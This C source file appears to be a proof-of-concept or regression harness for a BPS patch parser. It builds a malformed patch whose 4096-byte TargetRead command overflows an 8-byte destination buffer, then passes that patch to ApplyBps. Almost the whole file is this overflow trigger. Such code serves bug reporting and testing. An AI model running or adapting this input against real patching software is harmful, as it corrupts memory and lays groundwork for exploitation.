#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"
void Die(const char *e){ fprintf(stderr,"Die: %s\n",e); exit(1);}
static unsigned crc32_(const unsigned char*d,size_t n){unsigned c=0xFFFFFFFFu;for(size_t i=0;i<n;i++){c^=d[i];for(int j=0;j<8;j++)c=(c>>1)^((c&1)*0xEDB88320u);}return c^0xFFFFFFFFu;}
static size_t enc(unsigned char*o,unsigned long long v){size_t n=0;for(;;){unsigned char x=v&0x7f;v>>=7;if(v==0){o[n++]=0x80|x;break;}o[n++]=x;v--;}return n;}
int main(void){
  unsigned char src[16]; memset(src,0x41,sizeof src);
  unsigned char p[8192]; size_t n=0; memcpy(p,"BPS1",4); n=4;
  n+=enc(p+n,sizeof src);   /* src size */
  n+=enc(p+n,8);            /* dst size: 8 bytes */
  n+=enc(p+n,0);            /* metadata */
  /* command: TargetRead (cmd&3==1) of 4096 bytes: length-1 = 4095 -> (4095<<2)|1 */
  n+=enc(p+n,(4095ull<<2)|1);
  for(int i=0;i<4096;i++) p[n++]=0x42;
  unsigned c1=crc32_(src,sizeof src); memcpy(p+n,&c1,4); n+=4;
  unsigned c2=0; memcpy(p+n,&c2,4); n+=4;       /* dst crc: never reached before the overflow */
  unsigned c3=crc32_(p,n); memcpy(p+n,&c3,4); n+=4;
  size_t out=0;
  unsigned char*r=ApplyBps(src,sizeof src,p,n,&out);
  printf("returned %p out=%zu\n",(void*)r,out);
  return 0;}
